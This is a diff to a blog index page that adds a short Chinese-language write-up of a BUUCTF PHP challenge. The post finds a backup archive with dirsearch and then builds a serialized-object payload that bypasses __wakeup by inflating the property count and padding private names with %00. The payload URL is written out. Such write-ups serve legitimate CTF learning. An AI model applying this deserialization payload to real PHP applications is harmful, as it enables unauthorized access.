@@ -140,6 +140,84 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-buuctf" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/06/buuctf/">123</a>
+    </h1>
+  
+
+        
+        <a href="/2023/04/06/buuctf/" class="archive-article-date">
+  	<time datetime="2023-04-06T15:46:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-04-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="buuctf"><a href="#buuctf" class="headerlink" title="buuctf"></a>buuctf</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p><img src="/2023/04/06/buuctf/image-20230406224321087.png" alt="image-20230406224321087"></p>
+<p>进来的web网页确实新奇，哈哈。看见题目给的提示是备份网站然后在网上找了一下发现要用dirsearch来查找。dirsearch的使用方法为：在终端上移到下载的dirsearch的路径下，然后执行命令 <strong>python.exe dirsearch.py -u <a target="_blank" rel="noopener" href="http://0c820823-74bf-4def-8e57-fab6bec334c7.node4.buuoj.cn:81/">http://0c820823-74bf-4def-8e57-fab6bec334c7.node4.buuoj.cn:81</a> -e php</strong>   -u后面接上要查询的网页，-e 后面街上查询的语言 例如(php,asp)</p>
+<p><img src="/2023/04/06/buuctf/image-20230406225208380.png" alt="image-20230406225208380"></p>
+<p>然后经过漫长的等待之后发现了有一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<p><img src="/2023/04/06/buuctf/image-20230406225326027.png" alt="image-20230406225326027"></p>
+<p>下载完之后发现有5个文件</p>
+<p><img src="/2023/04/06/buuctf/image-20230406225508540.png" alt="image-20230406225508540"></p>
+<p><img src="/2023/04/06/buuctf/image-20230406230549165.png" alt="image-20230406230549165"></p>
+<p>flag.php里的flag是假的，然后查看index.php和class.php之后发现这是一道反序列化的题目，大致意思为给变量select赋值，在反序列化select，如何传入的password等于100，username&#x3D;’admin‘，则返回flag。然后开始序列化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=new Name(&#x27;admin&#x27;,100);</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br></pre></td></tr></table></figure>
+
+<p>得到序列化之后的代码：<strong>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</strong></p>
+<p>注意到有个 _wakeup函数，此函数绕过的魔术方法为将属性个数的值改为大于实际个数的值，就能够绕过 _wakeup函数</p>
+<p>即**O:4:”Name”:<u>3</u>:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<strong>但是将这个传入之后发现并不正确，查找其他大佬的wp后发现是因为username和admin的值是私有值，在序列化的时候真正的结果为</strong>O:4:”Name”:2:{s:14:” Name username”;s:5:”admin”;s:14:” Name password”;i:100;}**而在protect下序列化的结果为 **O:4:”Name”:2:{s:11:” * username”;s:5:”admin”;s:11:” * password”;i:100;}**所以在构造payload时应该填充%00在代替空格，即payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url+?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/04/06/buuctf/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-# 我的第一篇博客" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
